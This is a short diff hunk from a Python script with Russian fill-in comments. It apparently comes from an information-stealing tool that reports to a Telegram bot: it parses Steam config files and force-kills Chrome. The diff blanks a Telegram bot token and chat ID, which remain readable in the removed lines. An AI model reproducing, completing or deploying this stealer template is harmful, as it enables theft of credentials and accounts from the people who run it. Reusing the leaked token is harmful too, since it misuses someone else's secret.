@@ -33,8 +33,8 @@ from subprocess import Popen, PIPE
 from re import findall, match
 import vdf
 
-chat_id = '5767021807'#СЮДА CHAT ID
-bot = telebot.TeleBot('5715783385:AAH1-9sMZM966HPyBuoSqVYj6nCoUkLds9U')#СЮДА ТОКЕН БОТА
+chat_id = ''#СЮДА CHAT ID
+bot = telebot.TeleBot('')#СЮДА ТОКЕН БОТА
 
 try:
     subprocess.run(r'c:\windows\system32\cmd.exe /C taskkill /f /im chrome.exe')
